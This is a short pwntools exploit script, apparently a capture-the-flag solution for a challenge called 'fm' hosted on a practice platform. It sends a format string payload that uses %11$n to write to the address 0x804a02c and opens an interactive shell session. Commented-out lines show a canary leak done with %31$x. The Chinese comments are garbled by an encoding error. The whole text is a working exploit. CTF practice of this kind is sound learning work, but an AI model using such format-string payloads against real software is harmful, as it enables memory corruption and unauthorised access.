from pwn import*
elf=ELF('./fm')
p=remote('node4.buuoj.cn',27482)
#p=process('./fm')
context.log_level='debug'
#�޻��������©����й©canaryҲ��������
#p.sendline(b'%31$x')      
#canary=int(p.recv(8),16)
#���ø�ʽ���ַ���©��%n����x��ַ�ϵ�ֵ�����޸�
x=0x804a02c
payload=p32(x)+b'%11$n'
p.sendline(payload)
p.interactive()